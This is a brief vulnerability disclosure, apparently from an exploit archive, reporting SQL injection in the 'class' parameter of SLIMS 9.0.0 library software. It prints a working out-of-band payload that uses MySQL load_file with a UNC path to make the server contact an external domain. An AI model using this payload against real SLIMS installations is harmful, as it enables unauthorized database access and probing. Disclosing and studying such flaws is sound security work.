## Title: Senayan Library Management System v9.0.0 a.k.a SLIMS 9 SQLi
## Author: nu11secur1ty
## Vendor: https://slims.web.id/web/
## Software: https://github.com/slims/slims9_bulian/releases/download/v9.0.0/slims9_bulian-9.0.0.zip
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.0.0/SQLi

## Description:
The manual insertion `point 3` with `class` parameter appears to be
vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\0absu0byc9uwy8ivftx7f6auul0fo5cwfk6at2hr.again.com\\fbe'))+'
was submitted in the manual insertion point 3.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.

## STATUS: HIGH Vulnerability
